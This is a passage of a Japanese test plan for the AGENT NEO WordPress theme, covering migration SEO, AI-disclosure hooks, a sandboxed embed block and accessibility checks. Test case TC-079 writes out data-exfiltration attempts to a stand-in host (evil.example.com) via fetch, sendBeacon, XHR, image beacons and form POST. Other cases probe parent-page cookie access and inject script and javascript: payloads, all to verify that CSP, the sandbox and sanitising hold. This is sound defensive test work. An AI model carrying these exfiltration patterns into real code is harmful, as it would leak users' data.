| TC-060 | REQ-F-008 / REQ-NF-018 | 移行プラグインが構造変換プレビュー機能を持つ | (1) 移行プレビューを実行（dry-run mode） (2) 旧 WP ブロック構造と AGENT NEO ブロック構造の変換差分を確認 | (a) プレビューで変換結果が表示され、本番適用前に管理者が確認できる (b) プレビューと実際の投入結果が bit-identical（ACC-008 との整合） (c) 変換できないブロック（旧テーマ固有ショートコード等）が `unconverted_elements` として明示される | E2E | P1 |

---

### 8.7 P0 / P1 / P2 分類（§8 追加分）

- **P0 追加分**: TC-042（同意前 GA4 非発火）/ TC-043（同意後 GA4 発火）/ TC-045（advertising タグ非出力）/ TC-047（draft snapshot 除外）/ TC-048（crawl-map draft 除外）/ TC-049（nonce 漏洩防止）/ TC-050（ライセンスキー漏洩防止）
- **P1 追加分**: TC-031〜TC-035（運用品質）/ TC-037〜TC-038（LLMO）/ TC-040（LLMO entity graph）/ TC-044（Consent Mode v2 default denied）/ TC-046（拒否ルート）/ TC-051（snapshot allowlist 個別制御）/ TC-052〜TC-055（canonical+OGP 同時評価）/ TC-056〜TC-060（移行 SEO）
- **P2 追加分**: TC-036（SLO レポート）/ TC-039（AI citation log）/ TC-041（LLMO 計測サマリ）

---

### 8.8 GAP-RT ↔ TC マッピング表

| GAP-ID | カテゴリ | カバーする TC | 残存 carry |
|---|---|---|---|
| GAP-RT-036 | 運用品質（ACC-NF-007 / REQ-NF-013） | TC-031（WP 更新 preflight/postflight health-check）/ TC-032（PHP 8.2 互換 CI gate）/ TC-033（plugin conflict scan）/ TC-034（update preflight/postflight rollback）/ TC-035（cron 信頼性 + DLQ）/ TC-036（SLO health check 縮退） | PHP 8.3/8.4/8.5 の互換 TC は L4 carry（PERF-CARRY-002 相当）/ SLO 数値目標は PO 裁定待ち（GAP-RT-045 相当） |
| GAP-RT-037 | LLMO（ACC-NF-011 / REQ-NF-017） | TC-037（answer unit 生成）/ TC-038（AI crawler プリセット切替）/ TC-039（citation anchor + AI crawler log）/ TC-040（evidence graph + entity-graph スナップショット）/ TC-041（AI referral 計測イベント） | evidence graph の Automation SEO 連携 API 契約は L4 carry（CARRY-A3-003 相当）/ LLMO visibility ダッシュボードは Phase 2 |
| GAP-RT-038 | Consent Gate（REQ-NF-004 / REQ-NF-009） | TC-042（同意前非発火）/ TC-043（同意後発火 async 確認）/ TC-044（Consent Mode v2 default denied）/ TC-045（advertising タグ非出力 E2E）/ TC-046（拒否ルート） | 同意バナープラグイン選定（PERF-CARRY-002）が P1 blocking carry。選定前は TC-042〜046 は「外部バナープラグインを Mock に差し替え」で実施 |
| GAP-RT-039 | Snapshot allowlist（REQ-NF-004 / REQ-NF-015） | TC-047（draft snapshot 除外）/ TC-048（crawl-map draft 除外）/ TC-049（nonce 漏洩防止）/ TC-050（ライセンスキー漏洩防止）/ TC-051（snapshot_allowed=false 個別制御） | public ID opaque 化（CARRY-TO-L4 の L4 繰延分）は TC-026 と TC-047〜051 が補完関係。L4 で public_id 変換が実装された段階で TC-049 を更新 |
| GAP-RT-040 | Canonical + OGP 同時評価（REQ-F-011 / REQ-NF-018） | TC-052（canonical ↔ og:url 整合）/ TC-053（Yoast 共存時 OGP 二重出力排除）/ TC-054（noindex → sitemap 同時除外）/ TC-055（@graph 統合 JSON-LD 1件出力） | seo-conflict-rules.json OGP 優先ルール詳細は CARRY-A3-001（ADR Wave3 申し送り）。ADR 確定後に TC-053 の期待結果を更新 |
| GAP-RT-041 | 移行 SEO（REQ-F-008 / REQ-NF-018） | TC-056（URL マッピング生成）/ TC-057（301 リダイレクト設定・検証）/ TC-058（移行後 canonical 整合）/ TC-059（画像 diff レポート）/ TC-060（構造変換プレビュー ↔ 投入整合） | 移行差分表示粒度（HTML diff / セマンティック diff）は Q-007（未確定）。TC-060 の「bit-identical」条件は Q-007 解決後に精度を更新 |

---

### 8.9 L4 実装で実テスト化が必要な carry 一覧

以下の TC は L4 実装が完了するまで実テスト化が困難な項目（carry）です。

| Carry-ID | 関連 TC | 理由 | 解消条件 |
|---|---|---|---|
| CARRY-GRT036-001 | TC-031〜036 | `wp agent-neo health-check` / `conflict-scan` / `update-preflight` 等の CLI コマンドが未実装 | L4 で CLI コマンド実装後に実テスト化 |
| CARRY-GRT036-002 | TC-032 | PHP 8.2+ 専用テスト環境の準備が必要 | CI matrix に PHP バージョン別 job を追加（GAP-RT-031 ADR 対応後） |
| CARRY-GRT037-001 | TC-037 | answer unit フィールドを持つ `/posts/{id}/markdown` レスポンス拡張が未実装 | L4 LLMO 実装 Sprint で対応 |
| CARRY-GRT037-002 | TC-038〜041 | AI crawler access matrix / citation anchor / LLMO tracking endpoint が未実装 | L4 LLMO 実装 Sprint で対応（REQ-NF-017 サブタスク） |
| CARRY-GRT038-001 | TC-042〜046 | 同意バナープラグイン選定（PERF-CARRY-002）が blocking P1 carry。選定前は Mock バナーで代替 | PERF-CARRY-002 解消（ADR 更新）後にフル E2E に切り替え |
| CARRY-GRT039-001 | TC-047〜051 | `GET /agent-neo/v1/public/pages/snapshot` エンドポイントの snapshot allowlist 機能が未実装 | L4 snapshot 実装 Sprint で対応 |
| CARRY-GRT040-001 | TC-053 | Yoast SEO 共存時の OGP 二重出力排除は CARRY-A3-001（ADR Wave3 SEO 出力境界 ADR）が確定するまで期待結果が確定しない | ADR Wave3 確定後に TC-053 期待結果を更新し実テスト化 |
| CARRY-GRT041-001 | TC-056〜060 | 移行プラグイン（REQ-F-008）が未実装 | L4 移行プラグイン Sprint（P1）で対応 |
| CARRY-GRT041-002 | TC-060 | 移行差分表示粒度（HTML diff / セマンティック diff）は Q-007 未確定 | PO が Q-007 を裁定後に TC-060 の受入条件を精緻化 |

---

---

## 9. 2026-06-20 追加（ADR-025 由来 / AI 生成コンテンツ開示法規制対応）

> 本節は `docs/adr/ADR-025.md` の L4 検証 TC 候補（TC-061〜TC-065）を test-plan SSOT へ登録するものです。
> ADR-025 の L4 carry（CARRY-ADR025-001〜005）が実装されるまでは原則的に L4 carry として管理します。
> TC-ID は GAP-RT-041 対応 TC-060 に続き **TC-061 から採番**しています。

---

### 9.1 GAP-RT-055: AI 生成コンテンツ開示法規制（ADR-025）

**背景**: EU AI Act Article 50 / California SB 942 / C2PA v2.4 への対応方針が ADR-025（2026-06-20 PO確定）で確定した。対応責務は Automation SEO 登録時の同意に集約し、AGENT-NEO は disclosure レンダリングフックのみ提供する。本節ではその設計意図を検証するための TC 群を登録する。

| TC | 対象 | 種別 | 優先度 | 受入観点 |
|---|---|---|---|---|
| TC-061 | disclosure レンダリングフック / スロットの出力確認（注入データあり時） | Unit | P1 | AGENT-NEO テーマが disclosure スロット（フックポイント）を提供しており、Automation SEO からの注入データが存在する場合に disclosure ラベルが正しく HTML 出力されることを検証する。具体的には: (a) disclosure フック呼び出し時にスロットの HTML 出力が存在すること。※ 注入データなし時のデフォルト動作は TC-065（P2）が単独 owner であるため本 TC の受入観点に含まない（TC-065 参照）。※ Automation SEO 登録フロー自体の同意取得検証（未同意時のサービス停止等）は AGENT-NEO リポの検証対象外（Automation SEO 側の外部依存テスト）のため、CARRY-ADR025-001 に carry として分離する |
| TC-062 | テーマ disclosure スロットのレンダリング | Integration | P1 | Automation SEO が disclosure マーキング情報を AGENT-NEO の disclosure フック（スロット）へ注入した場合、フロントエンドに開示ラベルが正しくレンダリングされることを検証する |
| TC-063 | schema.org creator フィールドの AI マーキング出力 | Integration | P1 | Article JSON-LD の `creator` / `author` フィールドが、Automation SEO から受領した値を用いて標準 schema.org プロパティ（`creator` / `author` を `Person` または `Organization` の `@type` で）正しく出力できることを検証する。具体的な AI 生成を示すスキーマ形状（非標準プロパティ等）は「Automation SEO から受領する schema 形状に従い L4 で確定」（CARRY-ADR025-003 参照）のため、本 TC では出力構造の正確性のみを検証し、AI-generated を示す具体的プロパティ名を受入条件として固定しない |
| TC-064 | "fully AI-generated" vs "AI-assisted" 区別表示 | Integration | P1 | Automation SEO が disclosure フック経由で "fully AI-generated" または "AI-assisted" の区別情報を送信した場合、AGENT-NEO が対応するラベルを正しく表示することを検証する（EU AI Act Article 50 の 2 種別要件） |
| TC-065 | disclosure スロット非注入時のデフォルト動作 | Unit | P2 | Automation SEO から disclosure 情報が注入されない場合、AGENT-NEO が独自に AI 生成ラベルを出力しないことを検証する（テーマは AI 判断をしない原則 / REQ-NF-025 整合確認） |

---

### 9.2 P0 / P1 / P2 分類（§9 追加分）

- **P0 追加分**: なし（法規制対応は L4 実装 carry のため P1 以下）
- **P1 追加分**: TC-061（AGENT-NEO disclosure スロット出力確認・注入データあり時のみ / 非注入時デフォルト動作は TC-065 が単独 owner / 登録フロー検証は CARRY-ADR025-001 に分離）/ TC-062（disclosure スロットレンダリング）/ TC-063（schema.org AI マーキング）/ TC-064（AI 種別区別表示）
- **P2 追加分**: TC-065（非注入時デフォルト動作）

§4 P0/P1 リスト更新:

- P1 に追加: TC-061、TC-062、TC-063、TC-064
- P2 に追加: TC-065

---

### 9.3 GAP-RT ↔ TC マッピング（§9 追加分）

| GAP-ID | カテゴリ | カバーする TC | 残存 carry |
|---|---|---|---|
| GAP-RT-055 | 法規制対応（AI 開示）| TC-061（disclosure スロット出力確認・**注入データあり時のみ（P1）** / 非注入時デフォルトは TC-065 が owner / 旧「登録時同意フロー」はCARRY-ADR025-001へ分離）/ TC-062（disclosure スロット）/ TC-063（schema.org AI マーキング）/ TC-064（AI 種別区別表示）/ TC-065（**非注入時デフォルト動作（P2）** / TC-061 と責務分離） | CARRY-ADR025-001（同意文言法務確認 + Automation SEO 登録フロー同意ステップの外部依存契約テスト）/ CARRY-ADR025-002（SB 942 Legal opinion）/ CARRY-ADR025-003（disclosure フック仕様 L4 確定）/ CARRY-ADR025-004（EU AI Act 2026-12-02 猶予 WBS）/ CARRY-ADR025-005（C2PA 画像 latent マーキング Automation SEO 側実装計画） |

---

### 9.4 L4 実装で実テスト化が必要な carry 一覧（§9 追加分）

| Carry-ID | 関連 TC | 理由 | 解消条件 |
|---|---|---|---|
| CARRY-ADR025-001 | TC-061（外部依存部分）| (a) 登録時同意フローの具体的な文言・UI が法務確認前に未確定、(b) Automation SEO 登録フローの同意ステップ検証（未同意時のサービス停止）は AGENT-NEO リポでは実行不可の外部依存テスト | 法務レビュー完了後に Automation SEO 側と連動した契約テストとして実テスト化。TC-061（AGENT-NEO 側 disclosure スロット出力確認）は AGENT-NEO リポ内で独立実施可能 |
| CARRY-ADR025-003 | TC-062〜064（特に TC-063） | (a) disclosure フック仕様（disclosure スロット API、"fully AI-generated" / "AI-assisted" 区別情報の受け渡し形式）が L4 entry 前に未確定、および (b) Automation SEO から受領する disclosure の **JSON-LD payload 形状**（schema.org 標準プロパティ `creator` / `author` を用いた AI マーキング表現の具体的契約 — 値の型・必須フィールド・"fully AI-generated" / "AI-assisted" 区別フラグの埋め込み方式）が L4 entry 前に未確定。TC-063 は (b) の契約確定まで受入条件の精緻化が不可能 | L4 disclosure Sprint 着手前に (a)(b) 両仕様を確定後、TC-062〜064 の受入条件を精緻化。TC-063 は JSON-LD payload 形状の L4 確定が owner となる |
| CARRY-ADR025-005 | — | C2PA 画像 latent マーキングは Automation SEO 画像生成パイプラインの実装に依存（AGENT-NEO 側 not-in-scope） | Automation SEO 側 PM 議題化・実装完了後に AGENT-NEO 側への影響がないことを確認 |

---

## §10. ADR-026 由来 TC（AI 生成 HTML 埋め込みブロック / CSS 隔離 / dual-mode）— 2026-06-20 追加

> **由来 GAP**: GAP-RT-058（埋め込みブロック未設計 → RESOLVED-IN-L3 + CARRY-TO-L4）  
> **由来 ADR**: `docs/adr/ADR-026.md`（`agent-neo/embed` ブロック / CSS 隔離 / dual-mode設計）  
> **最重要原則**: 具体的な block.json 完全形・iframe sandbox 属性最終セット・CSP 文字列・postMessage プロトコル・sanitize allowlist・DSD SSR 詳細は全て L4 carry（CARRY-EMBED-001〜006）。本 TC は L3 段階の**受入観点**を登録する。

### 10.1 TC 一覧（TC-066〜TC-073 / TC-079）

| TC-ID | 対象 REQ / ADR | 前提条件 | 手順 | 受入条件 | 種別 | 優先度 |
|---|---|---|---|---|---|---|
| TC-066 | ADR-026 / REQ-NF-001a | `agent-neo/embed` ブロック（mode=interactive および mode=static）が実装済み・テーマ CSS が標準的なスタイルを持つ | **(mode=interactive)** (1) mode=interactive の埋め込みブロックをページに設置 (2) Playwright で iframe 内の要素の `computed style` を取得 (3) テーマ CSS が定義している `font-family` / `color` 等を確認。**(mode=static)** (4) mode=static の埋め込みブロックをページに設置（Shadow DOM / DSD） (5) shadow root に `:host { all: initial }` 等の明示 host リセットが適用されていることを HTML ソースで確認する (6) Playwright で shadow root 内要素の `computed style` を取得し、テーマ CSS の `font-family` / `color` 等が引き継がれていないことを確認 (7) shadow root 内の `<style>` ルールが light DOM の要素（同一ページの他ブロック等）に影響していないことを確認 | **(mode=interactive)** (a) iframe 内要素の `computed style` がテーマ CSS のフォント・カラー定義を継承していない（sandbox による CSS 隔離が機能している）(b) テーマの `*` セレクタ・要素セレクタが iframe 内に侵入していない。**(mode=static)** (c) shadow root に明示 host リセット（`:host { all: initial }` 等）が適用され、その結果 shadow 内要素の `computed style` がテーマの継承プロパティ（`font-family` / `color` 等）を引き継いでいないこと（Shadow DOM はセレクタ/非継承プロパティを遮断するが継承プロパティは host 経由で入るため、完全な視覚隔離はリセット適用が前提となる。リセット**なしに** Shadow DOM だけで継承が止まる、という前提で検証しない）(d) shadow root 内の `<style>` ルールが light DOM・他ブロックへ漏洩していない（同一ページの light DOM 要素の `computed style` が変化しない） | E2E | P1 |
| TC-067 | ADR-026 セキュリティ / REQ-NF-004 | `agent-neo/embed`（mode=interactive）が iframe sandbox 付きで実装済み（sandbox 属性の最終セットは CARRY-EMBED-002 で L4 確定） | (1) Playwright で iframe の `sandbox` 属性値を取得し **behavioral 不変条件**を検証する (2) iframe 内から `window.parent.document` へのアクセスを試みる JS を実行 (3) Console エラーと DOM アクセス結果を確認 | (a) **sandbox 属性が存在し、`allow-same-origin` トークンを含まない**（親 origin 隔離＝XSS 封じ込めの核心）(b) **`allow-top-navigation` / `allow-top-navigation-by-user-activation` トークンをいずれも含まない**（top-navigation 不許可）(c) **`allow-scripts` トークンを含む**（スクリプト実行に必要）(d) `allow-forms` 等の追加トークンは L4 設計判断として許容し、テストは禁止トークン（`allow-same-origin` / `allow-top-navigation*`）の**不在**で検証する (e) iframe 内 JS が `window.parent.document.cookie` / `window.parent.localStorage` にアクセスできない（`SecurityError` 発生）。最終 sandbox セットは CARRY-EMBED-002 で確定 | E2E | P0 |
| TC-068 | ADR-026 / postMessage resize | mode=interactive ブロックが実装済み・高さが動的に変わるコンテンツを iframe 内に持つ | (1) ページを Playwright でロード (2) iframe 内コンテンツの高さを変化させる操作を実行 (3) 親側 DOM の iframe 要素の `height` 属性 / `style.height` を確認 | (a) iframe 高さが postMessage で送信され、テーマ側 JS が iframe の `height` を動的に更新する (b) **`allow-same-origin` を含まない sandbox のため `event.origin` は opaque（`"null"`）になり、`event.origin === <sandbox-origin>` の特定 origin 一致照合は機能しない**。テーマ側は **`event.source === iframe.contentWindow`**（送信元 Window 照合）+ **iframe 生成時にテーマが埋め込む一意トークン（nonce / payload-id）のペイロード内検証** の 2 点を組み合わせ、正当な高さ更新メッセージのみ受理し、それ以外を無視することを確認する。`event.origin` の `=== <sandbox-origin>` 一致を合格条件としない（具体的な nonce 生成方式・メッセージスキーマは L4 carry CARRY-EMBED-002） | E2E | P1 |
| TC-069 | ADR-026 a11y / WCAG 2.1 SC4.1.2 | `agent-neo/embed`（mode=interactive）が実装済み | (1) ページの HTML ソースを確認 (2) axe で WCAG 2.1 frame-title ルールを実行 | (a) `<iframe>` 要素に `title` 属性が存在し、空文字でない (b) axe で `frame-title` ルール違反が 0 件 | unit / axe | P1 |
| TC-070 | ADR-026 SEO / mode=static | `agent-neo/embed`（mode=static）が Declarative Shadow DOM（DSD）で実装済み・PHP render_callback が実装済み | (1) `GET /wp-json/wp/v2/posts/{id}?context=view` でレスポンス JSON を取得 (2) `GET /posts/{id}` で HTML ソースを確認 | (a) mode=static ブロックの shadow root 内テキスト（見出し・説明文等）がサーバーサイドレンダリングされた HTML に含まれる（Googlebot が JS 非実行でもクロール可能な状態） (b) `<template shadowrootmode="open">` が含まれた PHP 出力が確認できる | integration | P1 |
| TC-071 | ADR-026 / `prefers-reduced-motion` | `agent-neo/embed`（mode=interactive）が実装済み・iframe 内に CSS animation / transition を持つコンテンツが設置済み | (1) Playwright で `prefers-reduced-motion: reduce` メディアクエリを有効化 (2) iframe 内のアニメーション要素の `computed style` を確認 | (a) `prefers-reduced-motion: reduce` が有効な場合、iframe 内 CSS アニメーションが停止または大幅に短縮される (b) `animation-duration: 0` / `transition-duration: 0` 等が適用されていることを CSS property で確認 | E2E | P2 |
| TC-072 | ADR-026 / REQ-NF-025（薄レンダラ原則 / mode 別 sanitize） | `agent-neo/embed` ブロックが実装済み / Automation SEO 側から `mode` / `embed_url` / `title` 等の payload が届く経路が確認済み（srcdoc / 直接 HTML POST の受け口は廃止） | (1) **mode=static 向け**: 不正な payload（`<script>` タグ・インラインイベントハンドラ（`onclick` 等）・`javascript:` URL を含む HTML）を `agent-neo/embed`（mode=static）ブロックへ投入し、Shadow DOM レンダリング結果を確認する (2) **mode=interactive 向け**: Automation SEO が sandbox-origin（`https://<sandbox-origin>/embed/{id}`）で生成・配信した embed URL がテーマに渡されることを確認する（テーマは embed URL を指す iframe を出力するのみ。`<script>` 入り HTML の直接 POST / srcdoc payload の受け口はテーマ側に存在しないことを確認する） | (a) テーマ側は payload の生成判断を行わない（テーマ独自の AI ロジックを持たない） (b) **mode=static**: テーマ側 sanitize（`wp_kses` / DOMPurify 等）が `<script>` タグ・インラインイベントハンドラ（`onclick` 等）・`javascript:` URL を除去していること。Shadow DOM 内に `<script>` タグが出力されていないこと（JS は一切実行しない。allowlist 詳細は CARRY-EMBED-004 で精緻化） (c) **mode=interactive**: テーマは **sandbox-origin の embed URL を指す iframe を出力するのみ**（untrusted HTML/JS を保持しない・sanitize しない＝それは sandbox-origin 側 Automation SEO の責務）。テーマ側 defense-in-depth は「**frame-src allowlist**（`frame-src https://<sandbox-origin>` のみ許可）+ **sandbox 属性**（`allow-same-origin` 不含 / `allow-top-navigation*` 不含）」で担保。`<script>` はサンドボックスオリジン上の HTML に含まれ、別オリジン iframe 隔離によって親 DOM コンテキストでは決して実行されないことを確認する（allowlist 詳細・sandbox-origin URL は L4 carry CARRY-EMBED-002 / CARRY-EMBED-003 で確定） | unit | P1 |
| TC-073 | ADR-026 / 固定ページ（page）post type | `agent-neo/embed` ブロックが実装済み / 固定ページ（page post type）の編集画面が利用可能 | (1) WordPress 管理画面で固定ページ（ページ編集）を開く (2) ブロック挿入メニュー（block inserter）から `agent-neo/embed` を検索・選択して固定ページに挿入する (3) 固定ページをプレビュー / 公開し、フロントエンドを確認する | (a) `agent-neo/embed` ブロックが固定ページ編集画面の block inserter に表示され、挿入できること（post type 制限なし）(b) 固定ページのフロントエンドで mode=interactive の iframe sandbox 隔離、および mode=static の Shadow DOM CSS 隔離が投稿（post）と同様に機能すること（テーマ CSS 非干渉確認）(c) 投稿と固定ページで隔離レンダリングの動作差異がないこと。【standalone 観点注記】`standalone` モード（REQ-F-038 / Automation SEO 不要で動作）では mode=interactive は利用不可。standalone 環境での `agent-neo/embed` ブロックは mode=static のみサポートし、interactive を設定した場合はフォールバックまたは非表示となることを確認する（投稿・固定ページ両 post type に適用） | E2E | P1 |
| TC-079 | ADR-026 §2 egress 制御 / REQ-NF-004 | `agent-neo/embed`（mode=interactive）が実装済み / **サンドボックスオリジン（`https://<sandbox-origin>/embed/{id}`）が HTTP レスポンスヘッダ CSP（`connect-src` / `img-src` / `form-action` default-deny）を配信済み**（CARRY-EMBED-003 解消後） | (1) 診断フォームコンテンツを含む mode=interactive の sandboxed iframe を含むページを Playwright でロードする。(2) **【fetch 検証】** iframe 内 JS から許可外 origin（例: `https://evil.example.com`）への `fetch()` を試みる。Console エラーを検証する。(3) **【sendBeacon 検証】** iframe 内 JS から `navigator.sendBeacon('https://evil.example.com/beacon', 'data')` を呼び出す。Console エラーおよびネットワークリクエストの発生有無（Playwright の `page.on('request')` で捕捉）を確認する。(4) **【XMLHttpRequest 検証】** iframe 内 JS から `new XMLHttpRequest()` で `https://evil.example.com/xhr` への POST を試みる。Console に `ContentSecurityPolicyError` が記録されることを確認する。(5) **【img beacon 検証】** iframe 内 JS から `new Image().src = 'https://evil.example.com/pixel.gif'` を実行する。Playwright の `page.on('request')` でリクエストが発生しないこと（`img-src` CSP ブロック）を確認し、Console エラーを検証する。(6) **【form POST 検証】** sandbox に `allow-forms` を含む場合（TC-067 受入条件（d）の L4 設計判断により許可されたとき）: iframe 内に `<form method="POST" action="https://evil.example.com/exfil">` を動的に生成して送信を試みる。Console エラーおよびネットワークリクエストの発生有無を確認する。 | (a) **許可外 origin への `fetch` が CSP `connect-src` 違反でブロックされ**、Playwright Console に `ContentSecurityPolicyError` が記録されること。(b) **`navigator.sendBeacon()` による許可外 origin への送信が CSP `connect-src` 違反でブロックされること**（sendBeacon は connect-src が制御対象）。レスポンスが受信されず、データが外部へ送信されないこと。(c) **`XMLHttpRequest` による許可外 origin への送信が CSP `connect-src` 違反でブロックされ**、`ContentSecurityPolicyError` が Console に記録されること。(d) **`new Image().src` を使った pixel beacon（img beacon）による外部送信が CSP `img-src` 違反でブロックされること**（Playwright `page.on('request')` でリクエスト未発生を確認）。(e) **【form POST 検証】`allow-forms` が有効な場合でも、許可外 origin への plain form POST が CSP `form-action` ディレクティブによりブロックされ**、`ContentSecurityPolicyError` が Console に記録されること。iframe 内の診断フォーム入力値が許可外 origin へ送信されないこと。(f) **fetch / sendBeacon / XHR / img beacon / form POST の全経路が許可外 origin に対して CSP によりブロックされること**（`connect-src` / `img-src` / `form-action` の default-deny が全チャネルをカバーしていることを確認）。【注記】egress default-deny は **サンドボックスオリジン配信の HTTP ヘッダ CSP で担保**する（srcdoc は使用しない）。埋め込みが正当に外部通信を要する場合は「専用 endpoint + 明示 CORS 契約を L4 で定義（CARRY-EMBED-003）」として引き継ぐ。本 TC は default-deny egress のブロック検証に専念する | E2E | **P1** |

### 10.2 P0 / P1 / P2 分類（§10 追加分）

- **P0 追加分**: TC-067（iframe sandbox 隔離 / `allow-same-origin` 不在確認 / XSS 封じ込め）
- **P1 追加分**: TC-066（CSS 非干渉）/ TC-068（postMessage resize / `allow-same-origin` 不含のため `event.origin` は opaque(null)・検証主軸は `event.source` + nonce/payload-id）/ TC-069（a11y title）/ TC-070（static mode indexable SSR）/ TC-072（薄レンダラ原則 / mode 別 sanitize：static は `<script>` 除去・interactive は別オリジン iframe 隔離 + frame-src allowlist で親 DOM 不実行保証）/ TC-073（固定ページでの block inserter 挿入・隔離レンダリング確認・standalone では mode=static のみ）/ TC-079（egress allowlist / サンドボックスオリジン HTTP ヘッダ CSP による診断 embed の外部送信 CSP ブロック確認）
- **P2 追加分**: TC-071（`prefers-reduced-motion`）

§4 P0/P1 リスト更新:

- P0 に追加: TC-067
- P1 に追加: TC-066、TC-068、TC-069、TC-070、TC-072、TC-073、TC-079
- P2 に追加: TC-071

### 10.3 GAP-RT ↔ TC マッピング（§10 追加分）

| GAP-RT | テーマ | 関連 TC | carry |
|---|---|---|---|
| GAP-RT-058 | 埋め込みブロック未設計（ADR-026 dual-mode） | TC-066（CSS 非干渉）/ TC-067（iframe sandbox XSS 封じ込め）/ TC-068（postMessage resize）/ TC-069（a11y title）/ TC-070（static mode indexable）/ TC-071（prefers-reduced-motion）/ TC-072（薄レンダラ原則）/ TC-073（固定ページ post type での block inserter 挿入・隔離レンダリング）/ **TC-079（egress allowlist / CSP connect-src・img-src・form-action ブロック確認）** | CARRY-EMBED-001（block.json 完全形）/ CARRY-EMBED-002（sandbox 属性最終セット / postMessage プロトコル）/ CARRY-EMBED-003（CSP 文字列 + **egress allowlist**）/ CARRY-EMBED-004（sanitize allowlist / DSD PHP 実装詳細）/ CARRY-EMBED-005（Abilities API 宣言）/ CARRY-EMBED-006（検証パイプライン追加） |

### 10.4 L4 実装で実テスト化が必要な carry 一覧（§10 追加分）

| Carry-ID | 関連 TC | 理由 | 解消条件 |
|---|---|---|---|
| CARRY-EMBED-001 | TC-066〜073 全体 | `agent-neo/embed` block.json 完全形（属性・支持・render_callback）が未確定のため全 TC の具体的な実装前提が不確定 | L4 embed Sprint 着手前に block.json 完全形を確定後、全 TC の受入条件を精緻化 |
| CARRY-EMBED-002 | TC-067 / TC-068 | iframe sandbox 属性最終セット（不変条件: `allow-scripts` 含む・`allow-same-origin` 不含・`allow-top-navigation*` 不含 / 追加トークン `allow-forms` 等は L4 判断）と postMessage プロトコル（origin 検証方式）が未確定 | L4 embed Sprint 着手前に確定後、TC-067 受入条件（d）の禁止トークン不在検証を精緻化 |
| CARRY-EMBED-003 | TC-067 / **TC-079** | 親ページ側 CSP 文字列（`frame-src https://<sandbox-origin>` 等）未確定のため TC-067 の完全な隔離検証が不可。**egress allowlist（`connect-src` / `img-src` / `form-action` default-deny + 許可 origin 列挙）はサンドボックスオリジンの HTTP ヘッダ CSP 仕様として未確定のため TC-079 の実テストが不可**。srcdoc は使用しないため「srcdoc-scoped CSP」の懸念は解消済み。**解消すべき残件**: ①親ページ frame-src allowlist（`frame-src https://<sandbox-origin>` のみ許可）の CSP 文字列確定、②サンドボックスオリジン側 HTTP ヘッダ CSP（`connect-src` / `img-src` / `form-action` default-deny + 許可 origin 列挙）の仕様確定 | L4 セキュリティ Sprint 着手前に①親ページ frame-src allowlist + ②サンドボックスオリジン HTTP ヘッダ CSP の両仕様を確定後、TC-067 / TC-079 受入条件に検証を追加 |
| CARRY-EMBED-004 | TC-072 | テーマ側 sanitize allowlist（`wp_kses` / DOMPurify）未確定のため TC-072 受入条件（b）の精緻化不可 | L4 embed Sprint 着手前に allowlist 確定後、TC-072 受入条件（b）を精緻化 |

---

## §11. a11y 新 5 要件 TC（GAP-RT-057 / CARRY-A11Y-001 / WordPress.org accessibility-ready 2026-05-06 改定）— 2026-06-20 追加

> **由来 GAP**: GAP-RT-057（L5 アクセシビリティ新 5 要件 → RESOLVED-IN-L3 + CARRY-TO-L4 / 再評価期限 2026-06-30）  
> **由来 carry**: CARRY-A11Y-001（L4 着手前に本節へ TC 登録 / P1）  
> **由来設計**: `docs/design/L5-visual-design.md` §5.1.A（WordPress.org accessibility-ready 2026-05-06 改定 新 5 要件）  
> **TC-ID**: 既存最終 TC-073 に続き **TC-074〜TC-078** として採番。  
> **注意**: §10 は ADR-026 / GAP-RT-058 埋め込みブロック専用。本節（§11）が a11y 新 5 要件の専用節。

### 11.1 TC 一覧（TC-074〜TC-078）

| TC-ID | 要件 # | 対象要件 | 前提条件 | 手順 | 受入条件 | 種別 | 優先度 |
|---|---|---|---|---|---|---|---|
| TC-074 | ① | **Responsive Reflow & Text Spacing**（WCAG SC 1.4.10 / SC 1.4.12） | AGENT NEO テーマ有効化・記事ページが存在 | (1) Playwright で `page.setViewportSize` を 320px 幅に設定（200% zoom 相当の最小 viewport）(2) CSS text-spacing bookmarklet（`line-height: 1.5 / letter-spacing: 0.12em / word-spacing: 0.16em`）を適用し、さらに段落要素（`p`）に `margin-block: 2em` を適用して段落間隔をフォントサイズの 2 倍に設定する（WCAG SC 1.4.12 段落間隔要件。`paragraph-spacing` は CSS プロパティとして存在しないため使用不可。段落間隔は段落要素の `margin-block` / `margin-bottom` 等で適用すること） (3) 横スクロールバー出現有無を確認 | (a) 横スクロールが発生しない（**`Math.max(document.documentElement.scrollWidth, document.body.scrollWidth) <= window.innerWidth`**。standards-mode では `documentElement` がスクロール要素となり `document.body.scrollWidth` のみでは横溢れを見逃す場合がある。`document.scrollingElement.scrollWidth` を利用することも可）(b) テキストの重複・切断・情報損失が視覚的に発生しない（Playwright スクリーンショット確認）(c) 適用した text-spacing 値（line-height ≥ 1.5 / letter-spacing ≥ 0.12em / word-spacing ≥ 0.16em / 段落間隔 ≥ フォントサイズの 2 倍 = `margin-block: 2em` 以上）でコンテンツが損失しないこと（d）CI で `scrollWidth > innerWidth` を検出した場合 fail | CI gate / E2E | P1 |
| TC-075 | ② | **Context-Change 防止**（WCAG SC 3.2.1 On Focus / SC 3.2.2 On Input） | AGENT NEO テーマ有効化・インタラクティブ要素（リンク・ボタン・フォーム）を含むページが存在 | (1) Playwright でページの全フォーカス可能要素を Tab キーで順次フォーカス (2) フォーカス移動ごとに `page.url()` / `page.title()` の変化および `page.context().pages()` での新規 window 発生を assert (3) セレクト要素・ラジオボタン等 On Input 要素の値変更後に `page.url()` 変化を assert (4) フォーカス・入力イベントで `window.location.href` が変化しないことを Playwright `page.evaluate` で確認 | (a) フォーカス移動（Tab / Shift+Tab）のみで URL 遷移・フォーム送信・ウィンドウ生成が発生しない（Playwright `expect(page).toHaveURL(originalUrl)` / `expect(context.pages()).toHaveLength(1)` で assert） (b) セレクト変更（`change` イベント発火）のみで自動ページ遷移が発生しない（Playwright `expect(page).toHaveURL(originalUrl)` で assert） (c) axe-core を実行する場合は**実在するルール ID のみ**使用すること（`on-focus-context-change` は axe-core に存在しないため使用しない。WCAG SC 3.2.1 / 3.2.2 関連で axe-core が持つルール（例: `select-name` 等）を使用するか、または上記 Playwright assertion のみで代替する） | E2E | P1 |
